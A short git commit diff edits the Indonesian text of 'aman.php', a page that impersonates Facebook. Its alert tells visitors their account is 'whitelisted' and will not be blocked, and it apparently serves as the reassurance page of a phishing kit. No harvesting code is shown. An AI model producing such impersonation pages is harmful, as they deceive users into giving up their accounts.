258d8fee32d9ce9278d7d07fd02d2d7a92652aed
bojes90 <50340804+bojes90@users.noreply.github.com>
2019-05-07 10:26:44 +0700

    Update aman.php

--- V1/aman.php
+++ V1/aman.php
@@ -1,10 +1,10 @@
 
 <html>
 <head>
-	<title>facebook kamu aman</title>
+	<title>Facebook ANDA telah aman</title>
 </head>
 <body>
-<script>alert('Facebook kamu terdaftar AKTIF dan masuk kedalam WhiteList, terima kasih telah memberitahu kami, Sekarang Facebook Kamu Tidak Akan Kami Blokir');</script>
+<script>alert('Facebook ANDA terdaftar AKTIF dan masuk kedalam WhiteList, Terima kasih telah memberitahu kami, Sekarang Facebook Kamu Tidak Akan Kami Blokir');</script>
 <?php
 ?>
 thanks
